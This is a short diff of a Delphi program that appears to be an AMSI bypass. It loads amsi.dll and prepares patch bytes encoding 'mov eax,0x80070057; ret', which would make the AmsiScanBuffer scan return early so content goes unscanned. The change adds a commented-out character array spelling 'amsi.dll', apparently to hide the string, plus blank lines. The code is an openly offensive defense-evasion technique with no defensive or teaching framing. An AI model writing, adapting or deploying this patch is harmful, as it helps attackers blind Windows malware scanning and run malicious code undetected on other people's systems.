@@ -21,7 +21,7 @@ type
 const
   Ass : Array[0..7] of byte = ($c3,$c3,$c3,$c3,$c3,$c3,$c3,$c3);
   AssTwo : Array[0..11] of byte = ($FF,$B8,$FF,$57,$FF,$00,$FF,$07,$FF,$80,$FF,$C3);
-
+  //DeeL : Array[0..7] of char = ('a','m','s','i','.','d','l','l');
 var
   BA, NBA: TByteArr;
 
@@ -61,6 +61,8 @@ var
   asbres : Pointer;
 
 try
+
+
   asbres := LoadAndFind('amsi.dll');
   SetLength(BA,6);
   BA[0] := AssTwo[1];
@@ -75,4 +77,3 @@ try
       Writeln(E.ClassName, ': ', E.Message);
   end;
 end.
-
